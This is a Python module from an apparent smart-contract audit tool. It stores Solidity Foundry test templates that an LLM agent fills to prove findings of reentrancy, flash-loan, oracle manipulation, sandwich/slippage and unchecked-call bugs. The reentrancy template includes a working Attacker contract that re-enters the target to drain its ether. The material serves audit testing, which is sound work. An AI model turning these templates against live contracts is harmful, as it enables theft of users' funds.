"""Solidity test-contract templates for each PoC strategy.

Every template is a Python string with ``{placeholders}`` that the generator
fills in.  Templates deliberately keep things minimal — just enough to prove
the finding — so the LLM agent can refine them further if needed.
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# Shared preamble injected at the top of every generated test
# ---------------------------------------------------------------------------
PREAMBLE = """\
// SPDX-License-Identifier: MIT
// Auto-generated PoC — web3audit-mcp
pragma solidity {solc_version};

import "forge-std/Test.sol";
import "forge-std/console.sol";
{extra_imports}
"""

# ---------------------------------------------------------------------------
# Reentrancy
# ---------------------------------------------------------------------------
REENTRANCY_TEMPLATE = """\
{preamble}

/// @notice Malicious contract that re-enters {target_contract}.{target_function}
contract Attacker {{
    {target_contract_type} public target;
    uint256 public attackCount;

    constructor(address _target) {{
        target = {target_contract_type}(_target);
    }}

    /// Trigger the vulnerable function
    function attack() external payable {{
        target.{target_function}{{value: msg.value}}({call_args});
    }}

    /// Callback — re-enter on ETH receive
    receive() external payable {{
        if (attackCount < 3) {{
            attackCount++;
            target.{target_function}({call_args});
        }}
    }}

    fallback() external payable {{
        if (attackCount < 3) {{
            attackCount++;
            target.{target_function}({call_args});
        }}
    }}
}}

contract {test_contract_name} is Test {{
    {target_contract_type} public target;
    Attacker public attacker;

    function setUp() public {{
        {setup_code}
        attacker = new Attacker(address(target));
        {post_setup}
    }}

    function {test_function_name}() public {{
        // Record state before attack
        uint256 targetBalBefore = address(target).balance;

        // Fund attacker and trigger
        vm.deal(address(attacker), 1 ether);
        attacker.attack{{value: 1 ether}}();

        // Attacker should have drained more than deposited
        uint256 attackerBal = address(attacker).balance;
        console.log("Attacker balance after:", attackerBal);
        assertGt(attackerBal, 1 ether, "Reentrancy exploit failed — attacker did not profit");
    }}
}}
"""

# ---------------------------------------------------------------------------
# Flash-loan
# ---------------------------------------------------------------------------
FLASH_LOAN_TEMPLATE = """\
{preamble}

contract {test_contract_name} is Test {{
    {target_contract_type} public target;

    function setUp() public {{
        {setup_code}
    }}

    /// @notice Simulates a flash-loan callback scenario
    function {test_function_name}() public {{
        // Snapshot state before
        {snapshot_before}

        // Simulate flash loan: mint tokens to this contract temporarily
        vm.startPrank(address(this));
        deal(address({token}), address(this), {loan_amount});

        // Call the vulnerable function (flash-loan callback)
        target.{target_function}({call_args});

        // Verify state was manipulated
        {assertion_code}
        vm.stopPrank();
    }}

    // Flash-loan callback stub (if needed by the target)
    function {callback_name}(
        address initiator,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {{
        // Re-enter or manipulate state here
        target.{target_function}({callback_args});
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }}
}}
"""

# ---------------------------------------------------------------------------
# Oracle manipulation
# ---------------------------------------------------------------------------
ORACLE_MANIPULATION_TEMPLATE = """\
{preamble}

contract {test_contract_name} is Test {{
    {target_contract_type} public target;

    function setUp() public {{
        {setup_code}
    }}

    /// @notice Proves oracle price can be manipulated to affect {target_function}
    function {test_function_name}() public {{
        // Step 1: Record price / state before manipulation
        {price_before}

        // Step 2: Manipulate the oracle / reserves
        // (mock the oracle response or manipulate AMM reserves)
        {manipulation_code}

        // Step 3: Call the vulnerable function with manipulated price
        target.{target_function}({call_args});

        // Step 4: Verify the exploit succeeded
        {assertion_code}
    }}
}}
"""

# ---------------------------------------------------------------------------
# Price / slippage
# ---------------------------------------------------------------------------
SLIPPAGE_TEMPLATE = """\
{preamble}

contract {test_contract_name} is Test {{
    {target_contract_type} public target;

    function setUp() public {{
        {setup_code}
    }}

    /// @notice Demonstrates sandwich / slippage vulnerability in {target_function}
    function {test_function_name}() public {{
        // Frontrun: manipulate price before victim's tx
        {frontrun_code}

        // Victim's transaction (the vulnerable call with amountOutMin=0)
        vm.startPrank({victim});
        target.{target_function}({call_args});
        vm.stopPrank();

        // Backrun: profit from price movement
        {backrun_code}

        // Assert attacker profited / victim lost value
        {assertion_code}
    }}
}}
"""

# ---------------------------------------------------------------------------
# Unchecked low-level call
# ---------------------------------------------------------------------------
UNCHECKED_CALL_TEMPLATE = """\
{preamble}

/// @notice Contract that rejects ETH to trigger silent failure
contract RejectETH {{
    receive() external payable {{
        revert("rejected");
    }}
    fallback() external payable {{
        revert("rejected");
    }}
}}

contract {test_contract_name} is Test {{
    {target_contract_type} public target;
    RejectETH public sink;

    function setUp() public {{
        {setup_code}
        sink = new RejectETH();
    }}

    /// @notice Proves .call{{value:}} return value is not checked
    function {test_function_name}() public {{
        // Fund the target contract
        vm.deal(address(target), 10 ether);

        // Point withdrawal to a contract that rejects ETH
        {point_to_sink}

        // Call the vulnerable function — should silently "succeed"
        // even though the ETH transfer failed
        target.{target_function}({call_args});

        // The target should still hold the ETH (transfer was silently ignored)
        assertGt(
            address(target).balance,
            0,
            "Unchecked call: ETH should still be in contract after failed transfer"
        );
        console.log("Target balance after failed transfer:", address(target).balance);
    }}
}}
"""

# ---------------------------------------------------------------------------
# Generic / exploratory (fallback for unknown detector types)
# ---------------------------------------------------------------------------
GENERIC_TEMPLATE = """\
{preamble}

contract {test_contract_name} is Test {{
    {target_contract_type} public target;

    function setUp() public {{
        {setup_code}
    }}

    /// @notice Exploratory test for {detector} finding in {target_function}
    /// @dev This is a scaffold — refine the assertions for your specific case.
    function {test_function_name}() public {{
        // TODO: Set up pre-conditions
        {pre_conditions}

        // Call the flagged function
        target.{target_function}({call_args});

        // TODO: Assert the vulnerability is triggered
        {assertion_code}
    }}
}}
"""

# ---------------------------------------------------------------------------
# Registry of templates by strategy name
# ---------------------------------------------------------------------------
TEMPLATES: dict[str, str] = {
    "reentrancy": REENTRANCY_TEMPLATE,
    "flash-loan": FLASH_LOAN_TEMPLATE,
    "oracle-manipulation": ORACLE_MANIPULATION_TEMPLATE,
    "price-slippage": SLIPPAGE_TEMPLATE,
    "unchecked-call": UNCHECKED_CALL_TEMPLATE,
    "generic": GENERIC_TEMPLATE,
}


def interpolate(template_name: str, **kwargs: str) -> str:
    """Fill placeholders in a template.

    Missing keys are replaced with ``/* TODO: fill {key} */`` so the
    output is always valid-ish Solidity that an agent can refine.
    """
    tmpl = TEMPLATES.get(template_name, TEMPLATES["generic"])
    # Build preamble
    kwargs.setdefault("solc_version", "^0.8.24")
    kwargs.setdefault("extra_imports", "")
    kwargs["preamble"] = PREAMBLE.format(**{
        k: kwargs.get(k, "") for k in ("solc_version", "extra_imports")
    })

    class SafeDict(dict):
        def __missing__(self, key: str) -> str:
            return f"/* TODO: fill {key} */"

    return tmpl.format_map(SafeDict(**kwargs))
